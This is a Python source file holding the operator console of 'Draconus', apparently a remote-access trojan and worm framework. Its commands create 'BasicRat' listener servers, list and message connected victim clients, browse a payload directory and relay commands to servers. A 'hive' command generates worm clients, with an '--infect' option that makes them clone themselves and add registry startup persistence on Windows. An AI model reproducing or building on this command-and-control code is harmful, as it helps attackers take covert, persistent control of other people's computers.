import click
import os

from click_shell import shell
from time import sleep

from .CC import CommandCenter



class ShellConstructor:
    def __init__(self):
        self.CoCe = CommandCenter()
    
    def begin(self) -> None:
        os.system("clear")
        self.CoCe.START()
    
    def exitShell(self, *args : any, **kwargs: any) -> None:
        print("EXIT PROGRAM")
    
    def buildDracoShell(self) -> object:
    
        @shell(prompt=f"[DRACONUS] >>", intro="------ Welcome To Draconus ! Put help for commands list ------- ", on_finished=self.exitShell)
        def draco_shell() -> None:
            pass

        @draco_shell.command()
        def help() -> None:
            print("************ Draconus Base Commands ************\n")
            print("****** clr           - Clear screen")
            print("****** exit          - Exit Comand Center. Draconus still working")
            print("****** show          - Show servers list, types, files etc. 'show --help'")
            print("****** make          - Creates new server. see: 'make --help' for instruction")
            print("****** kill <name>   - Delete server. Ex: 'kill MyServer' ")
            print("****** post          - Tool for load, save server config. see: 'post --help'")
            print("****** start         - Start listening on all servers. ")
            print("****** stop          - Stop listening on all servers")
            print("****** hive          - Creates worms (clients for specific server)'hive --help'")
            print("****** conn <name>   - Connect to Server Shell. Server must be created first.")
            print("****** quit          - Close Draconus and all servers")
        
        @draco_shell.command()
        def clr() -> None:
            os.system("clear")
        
        @draco_shell.command()
        @click.argument("name")
        @click.argument("types")
        @click.argument("port")
        @click.option("--ip", required=False, help="Server IP adreess")
        @click.option("--raw_len", "-rl", required=False, help="Set RAW_LEN parameter")
        @click.option("--http", required=False, is_flag=True, help="Enable http server if not default enabled")
        @click.option("--no_important", "-noi", is_flag=True, required=False, help="Dont show some no important messages. Less flood on screen")
        @click.option("--encode", "-e", required=False, help="Set format encoding")
        def make(name, types, port, ip, raw_len, http, no_important, encode) -> None:
            """\n*********** MAKE Function ***********\n
Creates a new server ready to operate. You need to provide its name, select the type, and specify the port (recommended: 1000 - 9999).\n
Each server operates as a separate process as long as Draconus is running.\n
To have the created server start accepting connections, you must switch it to "listening" mode.\n
ex: make my_server BasicRat 2233        - make BasicRat server on port 2233
ex: make echos Echo 3333 -e utf-8       - make Echo server on port 3333 with encode utf-8"""
            conf = {"NAME": name, "PORT" : port, "SERV_TYPE" : types}
            if ip:
                conf["IP"] = ip
            if raw_len:
                conf["RAW_LEN"] = int(raw_len)
            if http:
                conf["HTTP_ENABLE"] = True
            if no_important:
                conf["MSG_NO_IMPORTANT"] = True
            if encode:
                conf["FORMAT_CODE"] = encode
            self.CoCe.sendCMD("make", conf)
            sleep(1)
            self.CoCe.findSockets()
        
        @draco_shell.command()
        @click.option("--types", "-t", is_flag=True, required=False, help="Show avaible server types")
        @click.option("--config", "-c", is_flag=True, required=False, help="Show created servers config")
        @click.option("--lists", "-l", is_flag=True, required=False, help="Show simple created server list")
        def show(types, config, lists):
            if types:
                self.CoCe.sendCMD("showT")
            if config:
                self.CoCe.sendCMD("showS")
            if lists:
                self.CoCe.sendCMD("showL")
        
        @draco_shell.command()
        @click.argument("name")
        def conn(name):
            self.CoCe.sendCMD("check", name)
            resp = self.CoCe.reciveResponse()
            if resp == ["OK"]:
                serverShell = self.buildServerShell(name)
                serverShell()
        
        @draco_shell.command()
        def quit() -> None:
            self.CoCe.sendCMD("end")
            sleep(2)
            print("EXIT PROGRAM")
            os._exit(0)
        
        @draco_shell.command()
        @click.argument("name")
        @click.option("--infect", "-i", is_flag=True, required=False, help="Add cloning function to worms. Copy self and add to registry startup. WORKING ONLY ON WINDOWS !!!")
        def hive(name, infect) -> None:
            """ **** Welcome To Hive *******\n
Hatchering new worm working with specific server.\n
Basic clients 'Worms' operate on Linux and Windows. Primarily, the clients are designed for the Windows system and will not work on other systems.\n
ex: hive my_serv1\n
Every hatched worm will be placed in HIVE directory"""
            conf = self.CoCe.sendApi(name, "conf", response=True)
            if not conf:
                print("[CC] ERROR: not recived config")
                return
            if infect:
                conf["INFECT_WIN"] = True
            self.CoCe.sendCMD("hive", conf)
        
        @draco_shell.command()
        @click.option("--save", "-s", required=False, help="Save Server Config. ex: post -s my_server")
        @click.option("--imp", "-i", required=False, help="Import Server from file. Put only server name. ex: post -l my_server")
        @click.option("--list", "-l", "list_option", required=False, is_flag=True, help="Show saved server files")
        def post(save, imp, list_option) -> None:
            if save:
                self.CoCe.sendCMD("save", save)
            elif list_option:
                self.CoCe.sendCMD("listF")
            elif imp:
                self.CoCe.sendCMD("load", imp)
                sleep(1)
                self.CoCe.findSockets()

        
        @draco_shell.command()
        @click.argument("name")
        def kill(name) -> None:
            self.CoCe.sendCMD("kill", name)
        
        @draco_shell.command()
        def start() -> None:
            self.CoCe.sendCMD("startS")
        
        @draco_shell.command()
        def stop() -> None:
            self.CoCe.sendCMD("stopS")
            
        return draco_shell

    
    def buildServerShell(self, name : str) -> object:
        print("[CC] Build Server Shell")

        def exitServerShell(*args: any, **kwargs : any) -> None:
            print("Exit Server Shell")
        
        @shell(prompt=f"[{name}] >>", intro="------ Server Shell. Commands will be send directly to server ! Put help for commands list ------- ", on_finished=exitServerShell)
        def server_shell() -> None:
            pass

        @server_shell.command()
        def help():
            print("\n******************** Basic Server Command ***********************************")
            print("  clr          - Clear Screen")
            print("  start        - Start Server Listening")
            print("  stop         - Stop Server Listening")
            print("  show         - Show connected clients")
            print("  task         - Show active threads")
            print("  conf         - Show server config")
            print("  ls           - Show files in PAYLOAD Directory")
            print("  msg <cli_id> <message>           - Send message to cli_ID")
            print('  ex: msg 4 "Hello World"        - Send Hello World to client no 4')
            print('  ex: msg all "You are Hacked"   - Send message to all clients')
            print('  [!!] if you want a send longer message use brackets "" [!!]')
            self.CoCe.sendCMD("next", name, "help")
            sleep(0.3)
        
        @server_shell.command()
        def clr():
            os.system("clear")
        
        @server_shell.command()
        def start():
            self.CoCe.sendCMD("next", name, "serv", "start")
        
        @server_shell.command()
        def stop():
            self.CoCe.sendCMD("next", name, "serv", "stop")
        
        @server_shell.command()
        def show():
            self.CoCe.sendCMD("next", name, "cli", "show")
        
        @server_shell.command()
        def task():
            self.CoCe.sendCMD("next", name, "task", "show")
        
        @server_shell.command()
        def conf():
            self.CoCe.sendCMD("next", name, "serv", "conf")
        
        @server_shell.command()
        def ls():
            buff = "\n****** PAYLOAD Dir Files: ********\n"
            for f in os.listdir(self.CoCe.conf["PAYLOAD_DIR"]):
                buff += f"---- {f}  ----\n"
            print(buff)

        
        @server_shell.command()
        @click.argument("cli_id")
        @click.argument("message")
        def msg(cli_id, message) -> None:
            self.CoCe.sendCMD("next", name, "cli", "send", cli_id, message)

        @server_shell.command()
        @click.argument("cmd", nargs=-1)
        def ss(cmd):
            command = ["next", name]
            command.extend(cmd)
            self.CoCe.sendCMD(*command)

        return server_shell


    def START(self) -> object:
        self.begin()
        return self.buildDracoShell()

if __name__ == "__main__":
    builder = ShellConstructor()
    DS = builder.START()
    DS()


